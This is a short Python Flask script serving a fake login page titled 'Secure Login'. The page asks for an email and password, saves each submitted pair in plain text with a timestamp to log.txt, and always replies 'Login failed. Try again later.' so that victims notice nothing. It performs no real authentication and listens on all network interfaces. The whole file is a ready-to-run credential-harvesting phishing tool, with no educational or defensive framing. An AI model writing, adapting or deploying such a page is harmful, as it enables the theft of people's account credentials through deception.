from flask import Flask, request, render_template_string
import datetime


app = Flask(__name__)

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head><title>Secure Login</title></head>
<body>
  <h2>Login</h2>
  <form method="POST">
    <input type="text" name="email" placeholder="Email" required><br>
    <input type="password" name="password" placeholder="Password" required><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        with open("log.txt", "a") as f:
            f.write(f"{datetime.datetime.now()} | {email}:{password}\n")
        return "Login failed. Try again later."
    return render_template_string(LOGIN_HTML)


app.run(host='0.0.0.0', port=5000)